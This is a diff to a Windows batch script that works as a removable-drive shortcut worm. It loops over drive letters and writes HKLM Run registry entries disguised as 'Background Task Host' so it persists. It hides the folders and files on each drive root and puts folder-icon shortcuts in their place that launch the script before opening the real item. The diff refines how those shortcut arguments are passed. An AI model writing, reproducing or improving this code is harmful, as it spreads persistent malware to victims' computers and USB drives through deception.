@@ -35,7 +35,8 @@
 @echo off
 chcp 65001>nul
 
-title backgroundTaskHost.exe [MikronT]
+%~d0
+cd %~dp0
 
 
 
@@ -45,18 +46,14 @@ set key_target=
 for /f "tokens=1,* delims=- " %%i in ("%*") do set %%i
 if "%key_target%" NEQ "" start "%key_target%" explorer "%key_target%"
 
-if "%key_running%" == "1" exit
-set key_running=1
 
-rem echo.%*
-rem pause>nul
 
 
 
 
 
 :cycle
-for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
@@ -67,16 +64,7 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
           if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
             attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
-            )
-          )
-        )
-
-        for /f "delims=" %%x in ('dir "%%i:\*" /a:-d /b 2^>nul') do (
-          if "%%x" NEQ "desktop.ini" if "%%x" NEQ "pagefile.sys" if "%%x" NEQ "Thumbs.db" (
-            attrib +h "%%i:\%%x"
-            if not exist "%%i:\%%x.lnk" (
-              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0 --key_target=%%i:\%%x" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
+              shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"--key_target="""%%i:\%%x"""" /i:"%WinDir%\System32\SHELL32.dll,3"
             )
           )
         )
@@ -85,14 +73,5 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
   )
 )
 
-
-
 timeout /nobreak /t 10 >nul
 goto :cycle
-
-
-
-rem powershell $shortcut = ^(New-Object -comObject Wscript.Shell^).CreateShortcut^('%%i:\%%x.lnk'^); $shortcut.TargetPath = '%%i:\%%x'; $shortcut.Save^(^)
-
-rem tasklist | find /i "%~nx0">>nul || goto :cycle
-rem exit
